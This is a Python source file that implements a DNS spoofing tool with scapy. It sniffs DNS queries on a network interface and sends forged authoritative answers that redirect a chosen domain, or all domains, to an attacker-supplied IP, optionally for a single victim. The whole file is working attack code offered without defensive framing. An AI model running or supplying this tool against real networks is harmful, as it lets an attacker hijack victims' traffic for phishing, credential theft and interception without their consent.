from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP

class DNS_Spoofer:
    """DNS Spoofer that intercepts DNS queries and responds with spoofed IPs"""
    
    def __init__(self, interface, target_ip, domain, redirect_ip):
        self.interface = interface
        self.target_ip = target_ip
        self.domain = domain
        self.redirect_ip = redirect_ip

    def is_target_domain(self, query_name):
        if not self.domain or self.domain.strip() == "":
            # If no domain specified, spoof ALL domains
            return True
        # Match exact domain or subdomain
        return query_name == self.domain or query_name.endswith('.' + self.domain)

    def handle_dns_packet(self, packet):
        if packet.haslayer(DNS) and packet.haslayer(UDP):
            # DNS query
            if packet[DNS].qr == 0 and packet[DNS].opcode == 0:  # Standard query
                src_ip = packet[IP].src
                query_name = packet[DNSQR].qname.decode().rstrip('.')
                
                if (not self.target_ip or src_ip == self.target_ip) and self.is_target_domain(query_name):
                    print(f"[+] DNS request for {query_name} from {src_ip}")
                    
                    # Create spoofed DNS response
                    spoofed_pkt = IP(src=packet[IP].dst, dst=packet[IP].src) / \
                        UDP(sport=53, dport=packet[UDP].sport) / \
                        DNS(
                            id=packet[DNS].id,
                            qr=1,    # response
                            aa=1,    # authoritative
                            rd=packet[DNS].rd,  # recursion desired (copy from request)
                            ra=1,    # recursion available
                            qd=packet[DNS].qd,  # question section
                            an=DNSRR(rrname=packet[DNSQR].qname, ttl=60, rdata=self.redirect_ip)
                        )
                    send(spoofed_pkt, verbose=0, iface=self.interface)
                    print(f"[+] Spoofed {query_name} → {self.redirect_ip} for {src_ip}")
                else:
                    if self.target_ip and src_ip != self.target_ip:
                        print(f"[-] Ignoring request from non-target IP: {src_ip}")
                    elif self.domain and self.domain.strip() != "" and not self.is_target_domain(query_name):
                        print(f"[-] Ignoring non-target domain: {query_name}")

    def run(self):
        try:
            # Use a more specific filter to catch DNS queries
            sniff(filter="udp and port 53", iface=self.interface, prn=self.handle_dns_packet, store=0)
        except KeyboardInterrupt:
            print("\n[!] DNS spoofing stopped.")
        